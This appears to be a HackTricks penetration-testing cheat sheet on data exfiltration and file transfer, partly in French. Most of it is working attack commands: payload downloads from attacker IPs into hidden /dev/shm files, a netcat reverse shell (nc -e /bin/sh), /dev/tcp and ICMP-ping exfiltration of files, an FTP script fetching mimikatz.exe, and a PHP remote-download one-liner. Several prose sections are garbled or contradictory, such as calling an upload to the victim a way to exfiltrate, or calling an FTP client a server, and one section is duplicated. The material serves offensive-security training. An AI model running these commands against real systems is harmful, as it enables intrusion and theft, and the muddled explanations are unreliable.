# Exfiltration

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Trouvez les vulnérabilités les plus importantes afin de les corriger plus rapidement. Intruder suit votre surface d'attaque, effectue des analyses de menace proactives, trouve des problèmes dans l'ensemble de votre pile technologique, des API aux applications web et aux systèmes cloud. [**Essayez-le gratuitement**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) dès aujourd'hui.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Domaines couramment autorisés pour exfiltrer des informations

Consultez [https://lots-project.com/](https://lots-project.com/) pour trouver des domaines couramment autorisés qui peuvent être exploités

## Copier\&Coller Base64

**Linux**
```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```
**Windows**

Windows is the most widely used operating system in the world, making it a prime target for hackers. In this section, we will discuss various exfiltration techniques that can be used on Windows systems.

1. **Email**: One of the simplest ways to exfiltrate data is through email. Hackers can attach sensitive files to an email and send them to an external email address. This method is relatively easy to detect, as it leaves a clear trail in the email server logs.

2. **Web-based exfiltration**: Hackers can use web-based services to exfiltrate data from a compromised Windows system. This can include uploading files to cloud storage platforms or using file transfer protocols (FTP) to transfer data to an external server.

3. **DNS tunneling**: DNS tunneling is a technique that allows hackers to bypass firewalls and exfiltrate data by encapsulating it within DNS queries. This method can be difficult to detect, as DNS traffic is typically allowed through firewalls.

4. **Steganography**: Steganography is the practice of hiding data within other files, such as images or documents. Hackers can use steganography techniques to exfiltrate data from a Windows system without raising suspicion.

5. **Covert channels**: Covert channels are communication channels that are hidden within legitimate network traffic. Hackers can use covert channels to exfiltrate data from a compromised Windows system without being detected.

It is important for system administrators and security professionals to be aware of these exfiltration techniques and take appropriate measures to detect and prevent data exfiltration on Windows systems.
```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```
### Introduction

L'exfiltration de données est une technique couramment utilisée par les hackers pour extraire des informations sensibles d'un système cible. L'une des méthodes les plus courantes pour exfiltrer des données est l'utilisation du protocole HTTP.

### Méthodologie

1. **Compression des données**: Avant d'exfiltrer les données, il est recommandé de les compresser pour réduire leur taille. Cela facilite le transfert des données via le protocole HTTP.

2. **Encodage des données**: Une fois les données compressées, elles doivent être encodées pour être transférées via HTTP. L'encodage Base64 est souvent utilisé pour cette étape.

3. **Création de la requête HTTP**: La requête HTTP doit être créée pour envoyer les données exfiltrées. Cela peut être fait en utilisant des outils tels que cURL ou en écrivant un script personnalisé.

4. **Configuration du header HTTP**: Le header HTTP doit être configuré pour spécifier le type de contenu et les informations supplémentaires nécessaires pour le transfert des données.

5. **Envoi de la requête HTTP**: Une fois la requête HTTP configurée, elle peut être envoyée au serveur cible pour exfiltrer les données.

### Outils et ressources

- **cURL**: Un outil en ligne de commande permettant d'envoyer des requêtes HTTP et de récupérer des données à partir de serveurs distants.

- **Python**: Un langage de programmation polyvalent qui peut être utilisé pour écrire des scripts personnalisés pour l'exfiltration de données via HTTP.

- **Burp Suite**: Une suite d'outils de test de pénétration qui peut être utilisée pour intercepter et modifier les requêtes HTTP.

- **Wireshark**: Un analyseur de protocole réseau qui peut être utilisé pour capturer et analyser le trafic HTTP.

### Conclusion

L'exfiltration de données via HTTP est une méthode courante utilisée par les hackers pour extraire des informations sensibles d'un système cible. En comprenant les étapes et les outils nécessaires pour exécuter cette technique, les professionnels de la sécurité peuvent mieux se préparer à détecter et à prévenir de telles attaques.
```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```
**Windows**

Windows is the most widely used operating system in the world, making it a prime target for hackers. In this section, we will discuss various exfiltration techniques that can be used on Windows systems.

1. **Email**: One of the simplest ways to exfiltrate data is through email. Hackers can attach sensitive files to an email and send them to an external email address. This method is relatively easy to detect, as it leaves a clear trail in the email server logs.

2. **Web-based exfiltration**: Hackers can use web-based services to exfiltrate data from a compromised Windows system. This can include uploading files to cloud storage platforms or using file transfer protocols (FTP) to transfer data to an external server.

3. **DNS tunneling**: DNS tunneling is a technique that allows hackers to bypass firewalls and exfiltrate data by encapsulating it within DNS queries. This method can be difficult to detect, as DNS traffic is typically allowed through firewalls.

4. **Steganography**: Steganography is the practice of hiding data within other files, such as images or documents. Hackers can use steganography techniques to exfiltrate data from a Windows system without raising suspicion.

5. **USB exfiltration**: Physical access to a Windows system can allow hackers to exfiltrate data using USB devices. This can be done by copying sensitive files onto a USB drive or by using specialized tools that automatically exfiltrate data when a USB device is connected.

It is important for system administrators and security professionals to be aware of these exfiltration techniques and take appropriate measures to prevent data leaks. This can include implementing strong access controls, monitoring network traffic, and regularly updating security patches on Windows systems.
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```
### Télécharger des fichiers

* [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
* [**SimpleHttpServer affichant les requêtes GET et POST (également les en-têtes)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
* Module Python [uploadserver](https://pypi.org/project/uploadserver/):
```bash
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth:
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -H -F 'files=@file.txt'
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
```
### **Serveur HTTPS**

An HTTPS server is a secure web server that uses the HTTPS protocol to encrypt the communication between the server and the client. This ensures that the data transmitted between the two parties is protected from eavesdropping and tampering.

To set up an HTTPS server, you will need a valid SSL/TLS certificate. This certificate is used to verify the identity of the server and establish a secure connection with the client.

There are several methods to exfiltrate data from an HTTPS server:

1. **Data Leakage through HTTP Headers**: Some HTTP headers may contain sensitive information that can be extracted by an attacker. This includes headers like `Referer`, `User-Agent`, and `Cookie`. By manipulating these headers, an attacker can leak data to an external server.

2. **Data Leakage through Response Codes**: HTTP response codes can also be used to exfiltrate data. For example, an attacker can use a custom error page to encode and transmit data in the response code.

3. **Data Leakage through Request Methods**: HTTP request methods like `GET` and `POST` can be manipulated to exfiltrate data. An attacker can encode sensitive information in the request parameters or body and send it to an external server.

4. **Data Leakage through File Uploads**: If an HTTPS server allows file uploads, an attacker can exploit this feature to exfiltrate data. By uploading a malicious file with embedded data, the attacker can retrieve the data from the server.

To prevent data exfiltration from an HTTPS server, it is important to implement proper security measures such as input validation, secure coding practices, and regular security audits. Additionally, monitoring and analyzing server logs can help detect any suspicious activity and potential data leaks.
```python
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

### PYTHON 2
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
###

### PYTHON3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
###

### USING FLASK
from flask import Flask, redirect, request
from urllib.parse import quote
app = Flask(__name__)
@app.route('/')
def root():
print(request.get_json())
return "OK"
if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
###
```
## FTP

### Serveur FTP (python)

```python
import ftplib

def ftp_upload(file_path, host, username, password):
    try:
        ftp = ftplib.FTP(host)
        ftp.login(username, password)
        with open(file_path, 'rb') as file:
            ftp.storbinary('STOR ' + file_path, file)
        ftp.quit()
        return True
    except Exception as e:
        print('Error uploading file:', str(e))
        return False

def ftp_download(file_path, host, username, password):
    try:
        ftp = ftplib.FTP(host)
        ftp.login(username, password)
        with open(file_path, 'wb') as file:
            ftp.retrbinary('RETR ' + file_path, file.write)
        ftp.quit()
        return True
    except Exception as e:
        print('Error downloading file:', str(e))
        return False
```

Le code ci-dessus est un exemple de serveur FTP en python.

```python
import ftplib

def ftp_upload(file_path, host, username, password):
    try:
        ftp = ftplib.FTP(host)
        ftp.login(username, password)
        with open(file_path, 'rb') as file:
            ftp.storbinary('STOR ' + file_path, file)
        ftp.quit()
        return True
    except Exception as e:
        print('Erreur lors du téléchargement du fichier:', str(e))
        return False

def ftp_download(file_path, host, username, password):
    try:
        ftp = ftplib.FTP(host)
        ftp.login(username, password)
        with open(file_path, 'wb') as file:
            ftp.retrbinary('RETR ' + file_path, file.write)
        ftp.quit()
        return True
    except Exception as e:
        print('Erreur lors du téléchargement du fichier:', str(e))
        return False
```
```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```
### Serveur FTP (NodeJS)

The FTP server is a popular method for transferring files between a client and a server over a network. In this section, we will discuss how to set up and configure an FTP server using NodeJS.

#### Installation

To install the FTP server module in NodeJS, you can use the following command:

```bash
npm install ftp-server
```

#### Configuration

To configure the FTP server, you need to create a configuration file. Here is an example of a basic configuration file:

```javascript
const FtpSrv = require('ftp-server');

const ftpServer = new FtpSrv({
  url: 'ftp://127.0.0.1:21',
  pasv_url: 'ftp://127.0.0.1:3000',
  pasv_min: 3001,
  pasv_max: 3010,
  anonymous: true,
  greeting: 'Welcome to the FTP server',
  log: console.log,
});

ftpServer.on('login', ({ username, password }, resolve, reject) => {
  if (username === 'admin' && password === 'password') {
    resolve({ root: '/path/to/root' });
  } else {
    reject(new Error('Invalid username or password'));
  }
});

ftpServer.listen()
  .then(() => console.log('FTP server started'))
  .catch((err) => console.error('Error starting FTP server:', err));
```

In this configuration file, you can specify the FTP server's URL, passive mode URL, passive mode port range, whether anonymous login is allowed, the greeting message, and the root directory for authenticated users.

#### Starting the FTP Server

To start the FTP server, you can run the following command:

```bash
node ftp-server.js
```

This will start the FTP server and listen for incoming connections on the specified URL.

#### Connecting to the FTP Server

To connect to the FTP server, you can use an FTP client such as FileZilla. Enter the server's URL, username, and password to establish a connection.

Once connected, you can upload, download, and manage files on the server using the FTP client.

#### Conclusion

Setting up an FTP server using NodeJS is a straightforward process. By following the steps outlined in this section, you can easily configure and start an FTP server for file transfer purposes.
```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```
### Serveur FTP (pure-ftp)

The FTP (File Transfer Protocol) server is a commonly used method for transferring files between systems over a network. Pure-FTP is a popular FTP server software that provides a secure and efficient way to transfer files.

#### Exfiltration using FTP

Exfiltration refers to the unauthorized transfer of data from a system. In the context of hacking, exfiltration is often used to steal sensitive information from a target system. FTP can be used as a method for exfiltrating data from a compromised system.

To exfiltrate data using FTP, the hacker first needs to gain unauthorized access to the target system. Once access is obtained, the hacker can use FTP commands to transfer files from the compromised system to an external FTP server.

#### Steps for exfiltration using FTP

1. Gain unauthorized access to the target system.
2. Identify the files or data that need to be exfiltrated.
3. Use FTP commands to connect to an external FTP server.
4. Transfer the files or data from the compromised system to the external FTP server.
5. Verify the successful exfiltration of the data.

#### Mitigation measures

To prevent exfiltration using FTP, it is important to implement the following security measures:

- Regularly update and patch the FTP server software to address any known vulnerabilities.
- Implement strong access controls and authentication mechanisms to prevent unauthorized access to the FTP server.
- Monitor network traffic for any suspicious FTP activity.
- Encrypt sensitive data before transferring it using FTP.
- Implement intrusion detection and prevention systems to detect and block any unauthorized exfiltration attempts.

By following these mitigation measures, organizations can reduce the risk of data exfiltration through FTP and enhance the security of their systems.
```bash
apt-get update && apt-get install pure-ftp
```

```bash
#Run the following script to configure the FTP server
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```
### **Client Windows**

Le client Windows est un système d'exploitation largement utilisé, ce qui en fait une cible courante pour les attaques de piratage. Il existe plusieurs méthodes d'exfiltration de données à partir d'un client Windows compromis. Dans cette section, nous examinerons certaines de ces méthodes et les ressources associées.

#### **Méthodes génériques d'exfiltration de données**

1. **Transfert de fichiers** : Cette méthode consiste à copier les fichiers sensibles du client Windows vers un emplacement distant contrôlé par l'attaquant. Cela peut être fait en utilisant des protocoles tels que FTP, SCP ou SMB.

2. **Tunneling** : Le tunneling permet de faire passer le trafic réseau à travers un canal sécurisé. L'attaquant peut utiliser des outils tels que SSH ou VPN pour créer un tunnel entre le client Windows compromis et un serveur contrôlé par l'attaquant. Cela permet à l'attaquant de transférer des données en toute sécurité sans être détecté.

3. **Stéganographie** : La stéganographie est l'art de cacher des informations sensibles à l'intérieur d'autres fichiers, tels que des images ou des fichiers audio. L'attaquant peut utiliser des outils de stéganographie pour cacher les données exfiltrées à l'intérieur de fichiers apparemment innocents, ce qui rend leur détection plus difficile.

#### **Ressources utiles**

- [OpenSSH](https://www.openssh.com/) : OpenSSH est une suite d'outils de connectivité réseau qui permettent le chiffrement des communications entre un client et un serveur. Il peut être utilisé pour créer des tunnels sécurisés entre un client Windows compromis et un serveur contrôlé par l'attaquant.

- [Steghide](http://steghide.sourceforge.net/) : Steghide est un outil de stéganographie qui permet de cacher des données sensibles à l'intérieur de fichiers image et audio. Il peut être utilisé pour exfiltrer des données à partir d'un client Windows compromis en les cachant à l'intérieur de fichiers apparemment innocents.

- [Cobalt Strike](https://www.cobaltstrike.com/) : Cobalt Strike est un outil de test de pénétration qui offre des fonctionnalités avancées pour l'exfiltration de données. Il peut être utilisé pour créer des tunnels, transférer des fichiers et exécuter des commandes sur un client Windows compromis.

Ces méthodes et ressources peuvent être utilisées par les attaquants pour exfiltrer des données à partir d'un client Windows compromis. Il est important de comprendre ces techniques afin de mieux se protéger contre de telles attaques.
```bash
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Trouvez les vulnérabilités les plus importantes afin de pouvoir les corriger plus rapidement. Intruder suit votre surface d'attaque, effectue des analyses de menaces proactives, trouve des problèmes dans l'ensemble de votre pile technologique, des API aux applications web et aux systèmes cloud. [**Essayez-le gratuitement**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) dès aujourd'hui.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## SMB

Kali en tant que serveur
```bash
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`
```
Ou créez un partage smb **en utilisant samba** :
```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
comment = Samba on Ubuntu
path = /tmp/smb
read only = no
browsable = yes
guest ok = Yes
#Start samba
service smbd restart
```
# Exfiltration

Exfiltration is the process of unauthorized data transfer from a target system to an external location. This can be a critical step in a successful attack, as it allows the attacker to steal sensitive information from the target.

There are several methods that can be used for exfiltration, depending on the target system and the available resources. Some common exfiltration techniques include:

1. **File Transfer**: Attackers can transfer files from the target system to an external location using various protocols such as FTP, HTTP, or SMB.

2. **Covert Channels**: Covert channels are hidden communication channels that can be used to exfiltrate data. These channels can be created using techniques such as steganography, where data is hidden within innocent-looking files.

3. **Command and Control (C2) Channels**: Attackers can establish command and control channels with the target system to exfiltrate data. These channels can be created using techniques such as DNS tunneling or HTTP/S traffic.

4. **Data Exfiltration via Email**: Attackers can exfiltrate data by sending it as email attachments or by using email protocols such as SMTP.

5. **Cloud Storage**: Attackers can leverage cloud storage services to exfiltrate data. This can be done by uploading files to cloud storage platforms such as Dropbox or Google Drive.

To prevent exfiltration, it is important to implement strong security measures such as:

- **Network Segmentation**: Segregate sensitive data from the rest of the network to limit the potential impact of an exfiltration attempt.

- **Data Loss Prevention (DLP)**: Implement DLP solutions that can detect and prevent unauthorized data transfers.

- **Monitoring and Logging**: Regularly monitor network traffic and system logs to detect any suspicious activity or data exfiltration attempts.

- **User Education**: Train users to recognize and report any suspicious emails or files that may be used for exfiltration.

By understanding the various exfiltration techniques and implementing appropriate security measures, organizations can better protect their sensitive data from being leaked.
```bash
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```
## SCP

L'attaquant doit avoir SSHd en cours d'exécution.
```bash
scp <username>@<Attacker_IP>:<directory>/<filename>
```
## SSHFS

Si la victime dispose de SSH, l'attaquant peut monter un répertoire de la victime vers l'attaquant.
```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
```
## NC

NC (Netcat) est un outil polyvalent utilisé pour l'exfiltration de données lors de tests de pénétration. Il peut être utilisé pour établir des connexions réseau, transférer des fichiers, créer des tunnels et bien plus encore.

### Exfiltration de données avec NC

L'exfiltration de données avec NC peut être réalisée de différentes manières, en fonction du scénario et des besoins spécifiques. Voici quelques méthodes couramment utilisées :

#### 1. Transfert de fichiers

NC peut être utilisé pour transférer des fichiers d'un système compromis vers un système distant. Voici comment procéder :

- Sur le système compromis, exécutez la commande suivante pour envoyer un fichier vers un système distant :

```
nc <adresse_IP_système_distante> <port> < fichier_local
```

- Sur le système distant, exécutez la commande suivante pour recevoir le fichier :

```
nc -l -p <port> > fichier_destination
```

#### 2. Exfiltration de données via des connexions inversées

NC peut également être utilisé pour établir des connexions inversées, permettant ainsi l'exfiltration de données à partir d'un système compromis vers un système distant. Voici comment procéder :

- Sur le système compromis, exécutez la commande suivante pour établir une connexion inversée avec le système distant :

```
nc -e /bin/sh <adresse_IP_système_distante> <port>
```

- Sur le système distant, exécutez la commande suivante pour recevoir les données exfiltrées :

```
nc -l -p <port> > fichier_destination
```

#### 3. Exfiltration de données via des tunnels

NC peut être utilisé pour créer des tunnels entre des systèmes, permettant ainsi l'exfiltration de données de manière sécurisée. Voici comment procéder :

- Sur le système compromis, exécutez la commande suivante pour créer un tunnel vers le système distant :

```
nc -L -p <port_local> -d <adresse_IP_système_distante> <port_distante>
```

- Sur le système distant, exécutez la commande suivante pour recevoir les données exfiltrées via le tunnel :

```
nc -l -p <port_distante> > fichier_destination
```

### Conclusion

NC est un outil puissant pour l'exfiltration de données lors de tests de pénétration. Il offre de nombreuses fonctionnalités et peut être utilisé de différentes manières pour répondre aux besoins spécifiques d'un scénario donné. Cependant, il est important de l'utiliser de manière responsable et légale, en respectant les lois et réglementations en vigueur.
```bash
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file
```
To download a file from the victim's machine using the `/dev/tcp` method, you can use the following command:

```bash
cat < /dev/tcp/<victim_ip>/<port> > <local_file>
```

Replace `<victim_ip>` with the IP address of the victim's machine and `<port>` with the desired port number. `<local_file>` should be replaced with the name and path of the file you want to save on your local machine.

This command will read the contents of the file on the victim's machine and redirect it to the specified local file on your machine.

### Upload file to victim

To upload a file to the victim's machine using the `/dev/tcp` method, you can use the following command:

```bash
cat < <local_file> > /dev/tcp/<victim_ip>/<port>
```

Replace `<local_file>` with the name and path of the file you want to upload. `<victim_ip>` should be replaced with the IP address of the victim's machine, and `<port>` should be replaced with the desired port number.

This command will read the contents of the local file and redirect it to the specified location on the victim's machine.
```bash
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
```
### Télécharger un fichier sur la victime

To exfiltrate data from a victim's system, one effective method is to upload a file to the victim's machine. This allows you to transfer sensitive information from the victim's system to your own.

Here are the steps to upload a file to the victim:

1. **Identify the target**: Determine the victim's system that you want to upload the file to. This could be a server, a computer, or any other device connected to the network.

2. **Choose the file**: Select the file that contains the data you want to exfiltrate. It could be a document, a database file, or any other type of file that contains the desired information.

3. **Prepare the payload**: Create a payload that will be used to upload the file to the victim's system. This could be a script, a malicious file, or any other method that allows you to transfer the file.

4. **Exploit the vulnerability**: Identify and exploit a vulnerability in the victim's system that will allow you to execute the payload. This could be a software vulnerability, a misconfiguration, or any other weakness that can be exploited.

5. **Execute the payload**: Once the vulnerability is exploited, execute the payload on the victim's system. This will initiate the file upload process.

6. **Monitor the upload**: Monitor the upload process to ensure that the file is successfully transferred to the victim's system. This may involve monitoring network traffic, system logs, or any other method that allows you to track the progress of the upload.

7. **Retrieve the file**: Once the file is uploaded to the victim's system, retrieve it from the target machine. This could be done using various methods, such as accessing the file directly or using a backdoor that was established during the exploitation phase.

By following these steps, you can successfully upload a file to a victim's system and exfiltrate the desired data. Remember to always exercise caution and ensure that you have the necessary permissions and legal authorization before performing any hacking activities.
```bash
nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
# Inside victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```
ICMP (Internet Control Message Protocol) est un protocole de la couche réseau utilisé pour envoyer des messages de contrôle et d'erreur entre les hôtes sur un réseau IP. Il est souvent utilisé pour le diagnostic réseau et la résolution des problèmes. ICMP est largement utilisé pour la détection de la disponibilité des hôtes, la mesure de la latence du réseau et la découverte des routes. Cependant, il peut également être utilisé pour exfiltrer des données d'un réseau.

L'exfiltration de données via ICMP implique l'encapsulation des données dans des paquets ICMP pour les transmettre à un hôte distant. Cette méthode est souvent utilisée pour contourner les pare-feu et les systèmes de détection d'intrusion, car les paquets ICMP sont généralement autorisés à traverser les pare-feu et sont rarement surveillés de manière approfondie.

Il existe plusieurs outils et techniques disponibles pour exfiltrer des données via ICMP, notamment l'utilisation d'outils de tunneling ICMP tels que ICMPTX et ICMPsh. Ces outils permettent de créer un canal de communication bidirectionnel entre un hôte local et un hôte distant en utilisant des paquets ICMP.

Lors de l'exfiltration de données via ICMP, il est important de prendre en compte la taille maximale des paquets ICMP autorisée par le réseau cible, car les paquets trop volumineux peuvent être fragmentés ou bloqués par les pare-feu. Il est également essentiel de chiffrer les données exfiltrées pour garantir leur confidentialité.

En résumé, l'exfiltration de données via ICMP est une méthode couramment utilisée pour contourner les pare-feu et les systèmes de détection d'intrusion. Elle permet de transmettre des données d'un réseau à un autre en utilisant des paquets ICMP. Cependant, il est important de prendre en compte les limitations du réseau cible et de sécuriser les données exfiltrées pour éviter toute détection ou interception.
```bash
# To exfiltrate the content of a file via pings you can do:
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
#This will 4bytes per ping packet (you could probably increase this until 16)
```

```python
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
if pkt.haslayer(ICMP):
if pkt[ICMP].type == 0:
data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```
## **SMTP**

Si vous pouvez envoyer des données à un serveur SMTP, vous pouvez créer un SMTP pour recevoir les données avec python:
```bash
sudo python -m smtpd -n -c DebuggingServer :25
```
## TFTP

Par défaut dans XP et 2003 (dans d'autres, il doit être ajouté explicitement lors de l'installation)

Dans Kali, **démarrer le serveur TFTP** :
```bash
#I didn't get this options working and I prefer the python option
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /path/tp/nc.exe /tftp
```
**Serveur TFTP en python :**

```python
import socket
import struct

def tftp_server():
    # Create a UDP socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_socket.bind(('0.0.0.0', 69))

    print('TFTP server started and listening on port 69...')

    while True:
        data, client_address = server_socket.recvfrom(516)
        opcode = struct.unpack('!H', data[:2])[0]

        if opcode == 1:
            # Read request
            filename = data[2:data.index(b'\x00', 2)].decode('utf-8')
            mode = data[data.index(b'\x00', 2) + 1:data.index(b'\x00', data.index(b'\x00', 2) + 1)].decode('utf-8')

            print(f'Read request received from {client_address[0]}:{client_address[1]}')
            print(f'Filename: {filename}')
            print(f'Mode: {mode}')

            # Send file
            # ...

        elif opcode == 2:
            # Write request
            filename = data[2:data.index(b'\x00', 2)].decode('utf-8')
            mode = data[data.index(b'\x00', 2) + 1:data.index(b'\x00', data.index(b'\x00', 2) + 1)].decode('utf-8')

            print(f'Write request received from {client_address[0]}:{client_address[1]}')
            print(f'Filename: {filename}')
            print(f'Mode: {mode}')

            # Receive file
            # ...

        else:
            print(f'Invalid opcode {opcode} received from {client_address[0]}:{client_address[1]}')

if __name__ == '__main__':
    tftp_server()
```

Ce code est un exemple de serveur TFTP (Trivial File Transfer Protocol) écrit en python.

Le serveur crée une socket UDP et se met en écoute sur le port 69. Il attend ensuite des requêtes de lecture ou d'écriture de fichiers.

Lorsqu'une requête de lecture est reçue, le serveur extrait le nom du fichier et le mode de transfert à partir des données reçues. Ensuite, il peut envoyer le fichier demandé au client.

Lorsqu'une requête d'écriture est reçue, le serveur extrait également le nom du fichier et le mode de transfert. Ensuite, il peut recevoir le fichier envoyé par le client.

Si le serveur reçoit une opcode invalide, il affiche un message d'erreur.

Ce code peut être utilisé comme base pour créer un serveur TFTP personnalisé en python.
```bash
pip install ptftpd
ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
```
Dans **victim**, connectez-vous au serveur Kali :
```bash
tftp -i <KALI-IP> get nc.exe
```
## PHP

Téléchargez un fichier avec une seule ligne de code PHP :
```bash
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```
## VBScript

VBScript (Visual Basic Scripting Edition) est un langage de script développé par Microsoft. Il est principalement utilisé pour automatiser des tâches dans les environnements Windows. VBScript est souvent utilisé dans le contexte du piratage pour exfiltrer des données sensibles d'un système compromis.

### Méthodes d'exfiltration

#### 1. Exfiltration par e-mail

L'exfiltration par e-mail est l'une des méthodes les plus courantes utilisées pour extraire des données d'un système compromis. VBScript peut être utilisé pour envoyer des e-mails contenant les données sensibles à une adresse spécifiée. Cette méthode est souvent utilisée pour contourner les pare-feu et les systèmes de détection d'intrusion.

```vbscript
Set objEmail = CreateObject("CDO.Message")
objEmail.From = "adresse@expediteur.com"
objEmail.To = "adresse@destinataire.com"
objEmail.Subject = "Données sensibles"
objEmail.TextBody = "Voici les données sensibles : " & sensitiveData
objEmail.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/sendusing") = 2
objEmail.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpserver") = "serveur_smtp"
objEmail.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = 25
objEmail.Configuration.Fields.Update
objEmail.Send
```

#### 2. Exfiltration par FTP

L'exfiltration par FTP est une autre méthode couramment utilisée pour transférer des données d'un système compromis vers un serveur distant. VBScript peut être utilisé pour établir une connexion FTP et transférer les données sensibles vers le serveur distant.

```vbscript
Set objFTP = CreateObject("WinSCP.Session")
objFTP.Open "utilisateur:mot_de_passe@serveur_ftp"
objFTP.PutFile "chemin_local", "chemin_distant"
objFTP.Close
```

